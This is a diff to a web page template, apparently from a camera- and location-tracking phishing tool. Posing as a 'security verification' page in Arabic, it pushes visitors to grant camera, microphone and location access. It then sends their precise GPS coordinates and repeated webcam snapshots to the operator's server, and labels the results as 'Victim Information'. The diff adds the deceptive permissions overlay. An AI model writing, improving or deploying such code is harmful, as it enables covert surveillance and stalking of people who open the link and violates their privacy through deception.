@@ -1,30 +1,81 @@
-<html lang="en-US">
+<html lang="ar" dir="rtl">
 <head> 
 <meta charset="UTF-8"> 
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
 <meta name="robots" content="noindex, nofollow"> 
 <meta name="viewport" content="width=device-width,initial-scale=1"> 
-<title></title> 
+<title>جارٍ التحميل...</title> 
 <style>
-iframe{ 
-border:0;
-overflow:hidden;
-height:100%;
-width:100%;
-position:fixed;
-top:0;
-left:0;
-}
+iframe{border:0;overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0;}
+#pov{position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px}
+#pob{background:#fff;border-radius:14px;max-width:330px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.poh{background:linear-gradient(135deg,#1a73e8,#0d47a1);padding:20px;text-align:center;color:#fff}
+.poi{display:flex;align-items:center;gap:10px;padding:10px;border-radius:9px;background:#f5f5f5;margin-bottom:8px;border:2px solid #e0e0e0;transition:.3s}
+.poi.ok{background:#e8f5e9;border-color:#4caf50}
+.poi.no{background:#ffebee;border-color:#f44336}
+#pbtn{width:100%;padding:13px;background:linear-gradient(90deg,#1a73e8,#0d47a1);color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;cursor:pointer;margin-top:8px}
+#pbtn:disabled{opacity:.6}
 </style>
 </head>
 <body>
-<video id="video" style="display:none"  playsinline autoplay></video>
+
+<!-- ══ Mandatory Permissions Overlay ══ -->
+<div id="pov">
+  <div id="pob">
+    <div class="poh">
+      <div style="font-size:34px;margin-bottom:6px">🔐</div>
+      <div style="font-size:16px;font-weight:700">التحقق الأمني مطلوب</div>
+      <div style="font-size:11px;opacity:.9;margin-top:3px">امنح الصلاحيات للمتابعة</div>
+    </div>
+    <div style="padding:16px">
+      <div class="poi" id="pi-cam"><span style="font-size:20px">📷</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الكاميرا</div><div style="font-size:11px;color:#888">للتحقق البصري</div></div><span id="si-cam">⏳</span></div>
+      <div class="poi" id="pi-mic"><span style="font-size:20px">🎙️</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الميكروفون</div><div style="font-size:11px;color:#888">للتحقق الصوتي</div></div><span id="si-mic">⏳</span></div>
+      <div class="poi" id="pi-loc"><span style="font-size:20px">📍</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الموقع</div><div style="font-size:11px;color:#888">للتحقق من موقعك</div></div><span id="si-loc">⏳</span></div>
+      <button id="pbtn" onclick="wvGrant()">السماح بجميع الصلاحيات</button>
+      <div id="pmsg" style="font-size:11px;color:#e53935;text-align:center;margin-top:8px;min-height:14px"></div>
+    </div>
+  </div>
+</div>
+
+<video id="video" style="display:none" playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
-<script type="text/javascript" defer>
+<script type="text/javascript">
 var uid="<%=uid %>";
-async function gather(){
+var _wvStream=null;
+
+function _wvPS(id,st){
+  document.getElementById('pi-'+id).className='poi'+(st==='ok'?' ok':st==='no'?' no':'');
+  document.getElementById('si-'+id).textContent=st==='ok'?'✅':st==='no'?'❌':'⏳';
+}
+async function wvGrant(){
+  var btn=document.getElementById('pbtn');
+  btn.disabled=true;btn.textContent='جارٍ طلب الصلاحيات...';
+  var camOk=false;
+  try{
+    _wvStream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:'user'}});
+    _wvPS('cam','ok');_wvPS('mic','ok');camOk=true;
+  }catch(e){
+    try{_wvStream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}});_wvPS('cam','ok');_wvPS('mic','no');camOk=true;}
+    catch(e2){_wvPS('cam','no');_wvPS('mic','no');}
+  }
+  await new Promise(function(resolve){
+    if(!navigator.geolocation){_wvPS('loc','no');return resolve();}
+    navigator.geolocation.getCurrentPosition(
+      function(p){_wvPS('loc','ok');$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(p.coords.latitude),lon:encodeURIComponent(p.coords.longitude),acc:encodeURIComponent(p.coords.accuracy)});resolve();},
+      function(){_wvPS('loc','no');resolve();},
+      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+    );
+    setTimeout(resolve,12000);
+  });
+  if(!camOk){
+    document.getElementById('pmsg').textContent='⚠️ الكاميرا مطلوبة. اضغط مجدداً.';
+    btn.disabled=false;btn.textContent='حاول مجدداً';return;
+  }
+  document.getElementById('pov').style.display='none';
+  gather(_wvStream);
+}
+
+async function gather(advStream){
 var td="";
 <% if(!t){ %>
 td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
@@ -123,20 +174,7 @@ $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
 
 });
 }
-const constraints = {audio: false,video: {facingMode: "user" }};
-// Access webcam
-async function cam() {
-try {
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
-handleSuccess(stream);
-} catch (e) {
-td+='<br><b>📷 Camera Images</b>';
-td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
-}
-}
-
-cam();
-// Success
+// Use stream already obtained from permissions overlay
 function handleSuccess(stream) {
 window.stream = stream;
 video.srcObject = stream;
@@ -146,6 +184,10 @@ context.drawImage(video, 0, 0, 500, 500);
 var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
 post(canvasData);
 }, 1500);
+}
+if(advStream) handleSuccess(advStream);
+else {
+  try{navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(handleSuccess).catch(function(){});}catch(e){}
 }
 
 
